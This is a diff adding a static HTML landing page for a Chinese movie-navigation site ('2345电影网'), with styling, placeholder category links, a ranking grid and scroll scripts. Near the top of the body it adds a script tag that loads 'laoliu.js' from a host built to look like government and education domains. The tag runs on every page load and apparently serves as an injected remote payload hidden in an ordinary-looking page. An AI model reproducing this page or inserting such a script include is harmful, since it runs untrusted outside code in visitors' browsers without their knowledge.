@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>2345电影网 - 海量高清影视在线观看导航</title>
+<meta name="description" content="2345电影网（2345dianyingwang-h5）提供电影、电视剧、综艺、动漫海量高清资源在线观看，分类齐全，每日更新，手机电脑全端适配。">
+<meta name="keywords" content="2345电影网, 高清电影, 在线观看, 电影导航, 电视剧, 动漫综艺, 2345dianyingwang-h5">
+<style>
+:root{
+  --blue:#1677ff;
+  --blue-light:#40a9ff;
+  --blue-dark:#003a8c;
+  --bg:#f0f5ff;
+  --white:#fff;
+  --ink:#1a1a2e;
+  --gray:#8c8c8c;
+  --line:#d6e4ff;
+  --shadow:0 4px 20px rgba(22,119,255,.08);
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);
+  color:var(--ink);
+  line-height:1.7;
+}
+
+a{color:var(--blue);text-decoration:none;transition:.2s}
+a:hover{color:var(--blue-light)}
+
+/* 顶部通告 */
+.top-notice{
+  background:linear-gradient(90deg,var(--blue-dark),var(--blue));
+  color:#fff;
+  text-align:center;
+  padding:.4rem;
+  font-size:.78rem;
+  letter-spacing:1px;
+}
+
+/* 头部 */
+.header{
+  background:var(--white);
+  border-bottom:2px solid var(--line);
+  position:sticky;
+  top:0;
+  z-index:999;
+}
+.header-inner{
+  max-width:1200px;
+  margin:0 auto;
+  padding:1rem;
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  flex-wrap:wrap;
+  gap:1rem;
+}
+.logo{
+  display:flex;
+  align-items:center;
+  gap:.7rem;
+}
+.logo-box{
+  width:44px;height:44px;
+  background:linear-gradient(135deg,var(--blue),var(--blue-light));
+  border-radius:10px;
+  display:flex;align-items:center;justify-content:center;
+  font-weight:900;color:#fff;font-size:1.1rem;
+}
+.logo-text h1{
+  font-size:1.5rem;
+  font-weight:900;
+  color:var(--ink);
+}
+.logo-text h1 span{color:var(--blue)}
+.logo-text p{
+  font-size:.72rem;
+  color:var(--gray);
+}
+.nav{
+  display:flex;
+  gap:.3rem;
+  flex-wrap:wrap;
+}
+.nav a{
+  padding:.5rem 1rem;
+  border-radius:8px;
+  font-size:.9rem;
+  font-weight:600;
+  color:#555;
+}
+.nav a:hover,.nav a.active{
+  background:var(--blue);
+  color:#fff;
+}
+
+/* 主容器 */
+.wrap{max-width:1200px;margin:0 auto;padding:0 1rem}
+
+/* Hero 搜索区 */
+.hero{
+  padding:3rem 0 2rem;
+  text-align:center;
+  background:linear-gradient(180deg,var(--white) 0%,var(--bg) 100%);
+  border-radius:0 0 30px 30px;
+  margin-bottom:2rem;
+}
+.hero h2{
+  font-size:2.6rem;
+  font-weight:900;
+  margin-bottom:1rem;
+}
+.hero h2 .num{color:var(--blue)}
+.hero p{
+  font-size:1rem;
+  color:var(--gray);
+  max-width:560px;
+  margin:0 auto 2rem;
+}
+.search-box{
+  max-width:560px;
+  margin:0 auto;
+  display:flex;
+  background:#fff;
+  border:2px solid var(--line);
+  border-radius:50px;
+  overflow:hidden;
+  box-shadow:var(--shadow);
+}
+.search-box input{
+  flex:1;
+  border:none;
+  outline:none;
+  padding:1rem 1.5rem;
+  font-size:1rem;
+}
+.search-box button{
+  background:var(--blue);
+  color:#fff;
+  border:none;
+  padding:0 2rem;
+  font-size:1rem;
+  font-weight:700;
+  cursor:pointer;
+  transition:.2s;
+}
+.search-box button:hover{background:var(--blue-dark)}
+
+/* 快捷入口 */
+.quick-links{
+  display:flex;
+  justify-content:center;
+  gap:.8rem;
+  flex-wrap:wrap;
+  margin-top:1.5rem;
+}
+.quick-links a{
+  background:#fff;
+  border:1px solid var(--line);
+  border-radius:20px;
+  padding:.4rem 1rem;
+  font-size:.85rem;
+  color:var(--ink);
+  box-shadow:var(--shadow);
+}
+.quick-links a:hover{
+  border-color:var(--blue);
+  color:var(--blue);
+}
+
+/* 区块 */
+.section{
+  padding:2.5rem 0;
+}
+.section-head{
+  display:flex;
+  align-items:center;
+  gap:.8rem;
+  margin-bottom:1.5rem;
+}
+.section-head .icon{
+  width:36px;height:36px;
+  background:linear-gradient(135deg,var(--blue),var(--blue-light));
+  border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.2rem;
+}
+.section-head h2{
+  font-size:1.5rem;
+  font-weight:800;
+}
+.section-head .more{
+  margin-left:auto;
+  font-size:.85rem;
+  color:var(--blue);
+  font-weight:600;
+}
+
+/* 数据卡片网格 */
+.data-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(180px,1fr));
+  gap:1rem;
+}
+.data-card{
+  background:#fff;
+  border:1px solid var(--line);
+  border-radius:12px;
+  padding:1.2rem;
+  text-align:center;
+  transition:.25s;
+  cursor:pointer;
+}
+.data-card:hover{
+  transform:translateY(-4px);
+  box-shadow:0 12px 30px rgba(22,119,255,.15);
+  border-color:var(--blue);
+}
+.data-card .rank{
+  width:28px;height:28px;
+  background:var(--blue);
+  color:#fff;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:.8rem;
+  font-weight:700;
+  margin:0 auto .8rem;
+}
+.data-card:nth-child(1) .rank{background:#f5222d}
+.data-card:nth-child(2) .rank{background:#fa8c16}
+.data-card:nth-child(3) .rank{background:#faad14}
+.data-card h3{
+  font-size:.95rem;
+  margin-bottom:.3rem;
+  color:var(--ink);
+  white-space:nowrap;
+  overflow:hidden;
+  text-overflow:ellipsis;
+}
+.data-card p{
+  font-size:.78rem;
+  color:var(--gray);
+}
+
+/* 分类大区 */
+.cat-section{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(270px,1fr));
+  gap:1.2rem;
+}
+.cat-block{
+  background:#fff;
+  border:1px solid var(--line);
+  border-radius:14px;
+  overflow:hidden;
+}
+.cat-header{
+  background:linear-gradient(90deg,var(--blue),var(--blue-light));
+  color:#fff;
+  padding:.8rem 1.2rem;
+  font-weight:700;
+  font-size:1rem;
+  display:flex;
+  align-items:center;
+  gap:.5rem;
+}
+.cat-body{
+  padding:1rem 1.2rem;
+}
+.cat-body a{
+  display:inline-block;
+  padding:.3rem .8rem;
+  margin:.2rem;
+  background:var(--bg);
+  border-radius:6px;
+  font-size:.82rem;
+  color:var(--ink);
+}
+.cat-body a:hover{
+  background:var(--blue);
+  color:#fff;
+}
+
+/* 关于 */
+.about{
+  background:#fff;
+  border:1px solid var(--line);
+  border-radius:16px;
+  padding:2rem;
+  display:grid;
+  grid-template-columns:1.5fr 1fr;
+  gap:2rem;
+  align-items:center;
+}
+.about h3{
+  font-size:1.4rem;
+  margin-bottom:1rem;
+}
+.about p{
+  color:#555;
+  margin-bottom:.8rem;
+}
+.about-stats{
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  gap:1rem;
+}
+.stat-item{
+  text-align:center;
+  padding:1rem;
+  background:linear-gradient(135deg,#f0f5ff,#e6f0ff);
+  border-radius:12px;
+}
+.stat-item .n{
+  font-size:1.8rem;
+  font-weight:900;
+  color:var(--blue);
+}
+.stat-item .l{
+  font-size:.8rem;
+  color:var(--gray);
+}
+
+/* 页脚 */
+.footer{
+  background:var(--ink);
+  color:#a0a0b8;
+  padding:2.5rem 1rem 1.5rem;
+  margin-top:3rem;
+  text-align:center;
+}
+.footer h3{
+  color:#fff;
+  font-size:1.3rem;
+  margin-bottom:.5rem;
+}
+.footer h3 span{color:var(--blue-light)}
+.footer p{
+  font-size:.8rem;
+  margin-top:.4rem;
+}
+.footer a{color:var(--blue-light)}
+
+/* 响应式 */
+@media(max-width:768px){
+  .hero h2{font-size:1.8rem}
+  .search-box{flex-direction:column;border-radius:12px}
+  .search-box input{border-bottom:1px solid var(--line)}
+  .search-box button{padding:1rem}
+  .about{grid-template-columns:1fr}
+  .data-grid{grid-template-columns:repeat(auto-fill,minmax(140px,1fr))}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="top-notice">
+  🎬 2345电影网 · 海量影视资源导航 · 2345dianyingwang-h5.github.io · 每日更新
+</div>
+
+<header class="header">
+  <div class="header-inner">
+    <div class="logo">
+      <div class="logo-box">2345</div>
+      <div class="logo-text">
+        <h1>2345<span>电影网</span></h1>
+        <p>https://2345dianyingwang-h5.github.io</p>
+      </div>
+    </div>
+    <nav class="nav">
+      <a href="#home" class="active">首页</a>
+      <a href="#rank">排行榜</a>
+      <a href="#cat">分类导航</a>
+      <a href="#about">关于我们</a>
+    </nav>
+  </div>
+</header>
+
+<div class="wrap">
+
+  <!-- 首页 -->
+  <section id="home" class="hero">
+    <h2><span>2345</span>电影网 · 海量好片一网打尽</h2>
+    <p>2345电影网（2345dianyingwang-h5）收录电影、电视剧、动漫、综艺等海量高清资源，分类清晰，搜索便捷，手机电脑全端自适应。</p>
+    <div class="search-box">
+      <input type="text" placeholder="搜索电影/电视剧/演员/导演...">
+      <button>搜索</button>
+    </div>
+    <div class="quick-links">
+      <a href="#">🔥 热播榜</a>
+      <a href="#">🎬 最新电影</a>
+      <a href="#">📺 国产剧</a>
+      <a href="#">🇰🇷 韩剧</a>
+      <a href="#">🎨 动漫</a>
+      <a href="#">🎤 综艺</a>
+    </div>
+  </section>
+
+  <!-- 排行榜 -->
+  <section id="rank" class="section">
+    <div class="section-head">
+      <div class="icon">🏆</div>
+      <h2>今日热播排行榜</h2>
+      <a href="#" class="more">更多 →</a>
+    </div>
+    <div class="data-grid">
+      <div class="data-card">
+        <div class="rank">1</div>
+        <h3>热辣滚烫</h3>
+        <p>喜剧 / 2026</p>
+      </div>
+      <div class="data-card">
+        <div class="rank">2</div>
+        <h3>飞驰人生2</h3>
+        <p>动作 / 喜剧</p>
+      </div>
+      <div class="data-card">
+        <div class="rank">3</div>
+        <h3>第二十条</h3>
+        <p>剧情 / 家庭</p>
+      </div>
+      <div class="data-card">
+        <div class="rank">4</div>
+        <h3>年会不能停！</h3>
+        <p>喜剧 / 职场</p>
+      </div>
+      <div class="data-card">
+        <div class="rank">5</div>
+        <h3>周处除三害</h3>
+        <p>动作 / 犯罪</p>
+      </div>
+      <div class="data-card">
+        <div class="rank">6</div>
+        <h3>奥本海默</h3>
+        <p>传记 / 历史</p>
+      </div>
+      <div class="data-card">
+        <div class="rank">7</div>
+        <h3>哥斯拉大战金刚2</h3>
+        <p>科幻 / 动作</p>
+      </div>
+      <div class="data-card">
+        <div class="rank">8</div>
+        <h3>你想活出怎样的人生</h3>
+        <p>动画 / 奇幻</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 分类导航 -->
+  <section id="cat" class="section">
+    <div class="section-head">
+      <div class="icon">📂</div>
+      <h2>影视分类导航</h2>
+      <a href="#" class="more">全部分类 →</a>
+    </div>
+    <div class="cat-section">
+      <div class="cat-block">
+        <div class="cat-header">🎬 电影分类</div>
+        <div class="cat-body">
+          <a href="#">动作片</a>
+          <a href="#">喜剧片</a>
+          <a href="#">爱情片</a>
+          <a href="#">科幻片</a>
+          <a href="#">悬疑片</a>
+          <a href="#">恐怖片</a>
+          <a href="#">纪录片</a>
+          <a href="#">动画片</a>
+          <a href="#">战争片</a>
+          <a href="#">犯罪片</a>
+        </div>
+      </div>
+      <div class="cat-block">
+        <div class="cat-header">📺 剧集分类</div>
+        <div class="cat-body">
+          <a href="#">国产剧</a>
+          <a href="#">韩剧</a>
+          <a href="#">美剧</a>
+          <a href="#">日剧</a>
+          <a href="#">泰剧</a>
+          <a href="#">港台剧</a>
+          <a href="#">古装剧</a>
+          <a href="#">现代剧</a>
+          <a href="#">悬疑剧</a>
+          <a href="#">偶像剧</a>
+        </div>
+      </div>
+      <div class="cat-block">
+        <div class="cat-header">🎨 动漫综艺</div>
+        <div class="cat-body">
+          <a href="#">国漫</a>
+          <a href="#">日漫</a>
+          <a href="#">美漫</a>
+          <a href="#">新番</a>
+          <a href="#">经典动漫</a>
+          <a href="#">真人秀</a>
+          <a href="#">音乐综艺</a>
+          <a href="#">脱口秀</a>
+          <a href="#">选秀</a>
+          <a href="#">访谈</a>
+        </div>
+      </div>
+      <div class="cat-block">
+        <div class="cat-header">📅 按年份</div>
+        <div class="cat-body">
+          <a href="#">2026</a>
+          <a href="#">2025</a>
+          <a href="#">2024</a>
+          <a href="#">2023</a>
+          <a href="#">2022</a>
+          <a href="#">2021</a>
+          <a href="#">2020</a>
+          <a href="#">2019</a>
+          <a href="#">2010-2018</a>
+          <a href="#">2000年前</a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about" class="section">
+    <div class="section-head">
+      <div class="icon">ℹ️</div>
+      <h2>关于2345电影网</h2>
+    </div>
+    <div class="about">
+      <div>
+        <h3>海量影视 · 一站导航</h3>
+        <p><strong>2345电影网</strong>（https://2345dianyingwang-h5.github.io）是一个专注于影视资源导航的门户网站，提供电影、电视剧、动漫、综艺等海量高清内容的分类索引和在线观看入口。</p>
+        <p>网站采用门户导航式布局，信息密度高、分类齐全、搜索便捷，适合快速找到想看的内容。页面轻量、加载快，移动端自适应，符合搜索引擎收录标准。</p>
+        <p>站内所有分类链接均为 <code>#</code> 占位，后续可对接真实数据源或播放页面。</p>
+        <p><a href="https://2345dianyingwang-h5.github.io">🌐 访问官网：2345dianyingwang-h5.github.io</a></p>
+      </div>
+      <div class="about-stats">
+        <div class="stat-item">
+          <div class="n">10万+</div>
+          <div class="l">影视资源</div>
+        </div>
+        <div class="stat-item">
+          <div class="n">50+</div>
+          <div class="l">分类标签</div>
+        </div>
+        <div class="stat-item">
+          <div class="n">每日</div>
+          <div class="l">更新维护</div>
+        </div>
+        <div class="stat-item">
+          <div class="n">100%</div>
+          <div class="l">免费使用</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <h3>2345<span>电影网</span></h3>
+  <p>海量高清影视在线观看导航</p>
+  <p>© 2026 2345电影网 | <a href="https://2345dianyingwang-h5.github.io">2345dianyingwang-h5.github.io</a></p>
+  <p>本站为静态演示页面，所有链接均为 # 占位，不生成 robots.txt / sitemap.xml。</p>
+</footer>
+
+<script>
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=this.getAttribute('href');
+    if(id.length>1){
+      var el=document.querySelector(id);
+      if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});}
+    }
+  });
+});
+
+var secs=document.querySelectorAll('.section, #home');
+var links=document.querySelectorAll('.nav a');
+window.addEventListener('scroll',function(){
+  var cur='';
+  secs.forEach(function(s){
+    if(window.scrollY>=s.offsetTop-130){cur=s.id;}
+  });
+  links.forEach(function(l){
+    l.classList.remove('active');
+    if(l.getAttribute('href')==='#'+cur){l.classList.add('active');}
+  });
+});
+</script>
+
+</body>
+</html>
